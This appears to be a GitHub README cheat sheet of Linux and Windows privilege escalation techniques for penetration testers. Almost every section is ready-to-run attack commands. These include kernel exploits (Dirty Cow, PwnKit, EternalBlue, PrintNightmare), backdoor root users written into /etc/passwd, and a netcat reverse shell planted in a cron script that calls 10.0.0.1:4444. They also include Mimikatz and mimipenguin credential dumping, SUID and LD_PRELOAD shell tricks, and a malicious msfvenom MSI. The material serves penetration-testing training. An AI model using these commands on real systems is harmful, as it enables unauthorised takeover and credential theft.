# PrivEsc-Techniques


Privilege escalation is a critical skill for ethical hackers and penetration testers. After gaining initial access to a system, attackers often seek to escalate privileges to gain greater control, access sensitive information, or run higher-level commands.

---

## 🔗 Resources

- [GitHub: Privilege Escalation Repositories](https://github.com/topics/privilege-escalation?o=desc&s=stars)  
- [Infosec Writeups: Privilege Escalation Techniques](https://infosecwriteups.com/privilege-escalation-techniques-for-ethical-hackers-7b593d92dfca)

 ---
## 📚 Table of Contents

1. [Kernel Exploits](#1-kernel-exploits)
2. [Misconfigured File Permissions](#2-misconfigured-file-permissions)
3. [Sudo Misconfigurations](#3-sudo-misconfigurations)
4. [Cron Jobs / Scheduled Tasks](#4-cron-jobs-scheduled-tasks)
5. [Weak Services](#5-weak-services)
6. [Password Hunting](#6-password-hunting)
7. [SSH Key Abuse](#7-ssh-key-abuse)
8. [Environment Variable Manipulation](#8-environment-variable-manipulation)
9. [NFS Misconfigurations](#9-nfs-misconfigurations)
10. [Windows-Specific Techniques](#10-windows-specific-techniques)
11. [Automated Tools](#11-automated-tools)
12. [Python Commands](#12-Python-Commands)
 ---

## 1. Kernel Exploits

* **Linux
- **Dirty Cow (CVE-2016-5195)**
  ```bash
  gcc -pthread dirty.c -o dirty -lcrypt
  ./dirty
  ```

* **PwnKit (CVE-2021-4034)**

  ```bash
  wget https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/pwnkit.c
  gcc pwnkit.c -o pwnkit
  ./pwnkit
  ```

### Windows

* **EternalBlue (MS17-010)**

  ```powershell
  msfconsole
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOSTS <target>
  exploit
  ```

* **PrintNightmare (CVE-2021-1675 / CVE-2021-34527)**

  ```powershell
  Import-Module .\CVE-2021-1675.ps1
  Invoke-Nightmare -NewUser "hacker" -NewPassword "Passw0rd!"
  ```

---

## 2. Misconfigured File Permissions

### A. World-Writable Files

**Linux**

```bash
find / -perm -2 -type f 2>/dev/null
```

Exploit `/etc/passwd`:

```bash
echo "hacker::0:0::/root:/bin/bash" >> /etc/passwd  
su hacker
```

**Windows**

```powershell
icacls "C:\Program Files\Vulnerable\*"
echo "net user hacker Passw0rd! /add & net localgroup administrators hacker /add" > exploit.bat
```

### B. SUID/SGID Binaries (Linux)

```bash
find / -perm -4000 -type f 2>/dev/null
./bash -p  # If /bin/bash has SUID
```

---

## 3. Sudo Misconfigurations

### A. Sudo Without Password

```bash
sudo -l
sudo vi /etc/passwd
:!bash
```

### B. Wildcard Exploitation

```bash
echo 'chmod +s /bin/bash' > exploit.sh  
sudo /bin/chown --reference=exploit.sh /bin/bash  
/bin/bash -p
```

---

## 4. Cron Jobs / Scheduled Tasks

### Linux

```bash
cat /etc/crontab  
ls -la /etc/cron.*
```

Writable script:

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f" > script.sh
```

### Windows

```powershell
schtasks /query /fo LIST /v
echo "net user hacker Passw0rd! /add" > C:\Tasks\exploit.bat
```

---

## 5. Weak Services

### A. MySQL Running as Root

```bash
mysql -u root -p  
\! sh
```

### B. Docker Privilege Escalation

```bash
docker run -v /:/mnt -it alpine  
chroot /mnt
```

---

## 6. Password Hunting

### A. Search in Files

**Linux**

```bash
grep -ri "password" /var/www /etc 2>/dev/null
```

**Windows**

```powershell
findstr /si "password" *.txt *.xml *.config
```

### B. Extract from Memory

**Linux**

```bash
wget https://github.com/huntergregal/mimipenguin/releases/download/v1.0.1/mimipenguin_1.0.1-1kali0_all.deb  
dpkg -i mimipenguin_1.0.1-1kali0_all.deb  
mimipenguin
```

**Windows**

```powershell
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

---

## 7. SSH Key Abuse

### A. Finding Keys

```bash
find / -name "id_rsa*" 2>/dev/null
```

### B. Using Keys

```bash
chmod 600 found_key  
ssh -i found_key root@localhost
```

---

## 8. Environment Variable Manipulation

### A. LD\_PRELOAD (Linux)

```bash
echo 'int main(){setuid(0);system("/bin/bash");}' > exploit.c  
gcc -fPIC -shared -o exploit.so exploit.c  
sudo LD_PRELOAD=./exploit.so <command>
```

### B. PATH Hijacking

```bash
echo "/bin/bash" > /tmp/ls  
chmod +x /tmp/ls  
export PATH=/tmp:$PATH
```

---

## 9. NFS Misconfigurations

```bash
showmount -e <target>  
mkdir /tmp/nfs  
mount -o rw <target>:/home/user /tmp/nfs  
echo 'int main(){setuid(0);system("/bin/bash");}' > /tmp/nfs/exploit.c  
gcc /tmp/nfs/exploit.c -o /tmp/nfs/exploit  
chmod +s /tmp/nfs/exploit
```

---

## 10. Windows-Specific Techniques

### A. AlwaysInstallElevated

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  
msfvenom -p windows/adduser USER=hacker PASS=Passw0rd! -f msi > exploit.msi  
msiexec /quiet /qn /i exploit.msi
```

### B. Token Impersonation

```powershell
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
```

---

## 11. Automated Tools

### Linux

* **LinPEAS**

  ```bash
  curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
  ```

* **Linux Exploit Suggester**

  ```bash
  ./linux-exploit-suggester.sh
  ```

### Windows

* **WinPEAS**

  ```powershell
  .\winPEASany.exe
  ```

* **PowerUp**

  ```powershell
  Invoke-AllChecks
  ```

---

## 12. Python Commands

* **Pty Spawn**

This command is commonly used in penetration testing and security assessments to upgrade a non-interactive shell to an interactive one, providing better functionality such as tab completion and the ability to use the arrow keys.
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
